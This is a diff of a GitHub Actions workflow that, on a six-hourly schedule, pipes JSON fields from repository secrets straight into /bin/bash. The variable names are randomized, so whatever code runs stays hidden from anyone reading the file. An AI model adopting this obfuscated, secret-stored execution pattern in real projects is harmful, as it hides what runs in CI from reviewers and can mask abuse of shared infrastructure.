@@ -1,28 +1,22 @@
 name: daoshoul
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 2/6 * * *'
+    - cron: '13 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: daoshoul
         env:
-          i965: ${{ secrets.i965 }}
+          rs115: ${{ secrets.rs115 }}
         run: |
-          echo $i965 | jq -r .hw82455 | /bin/bash
-          echo $szwdx5 | jq -r .w464 | /bin/bash
-          echo $akik346 | jq -r .buqq568 | /bin/bash
-          echo $xasa58465 | jq -r .ne385 | /bin/bash
-          echo $glmyb567 | jq -r .soc6526 | /bin/bash
-          echo $gdps245 | jq -r .lrav83181 | /bin/bash
-          echo $irv9095 | jq -r .d5187 | /bin/bash
-          echo $vjd405 | jq -r .u200 | /bin/bash
-          echo $aceo689 | jq -r .id22 | /bin/bash
-          echo $yt36201 | jq -r .kc83 | /bin/bash
-          echo $il749 | jq -r .t0 | /bin/bash
+          echo $rs115 | jq -r .qtqtk93706 | /bin/bash
+          echo $obue0 | jq -r .xaub1 | /bin/bash
+          echo $du38875 | jq -r .tmfq478 | /bin/bash
+          echo $fpg503 | jq -r .yao00593 | /bin/bash
+          echo $ysojs038 | jq -r .ctmzj78883 | /bin/bash
 
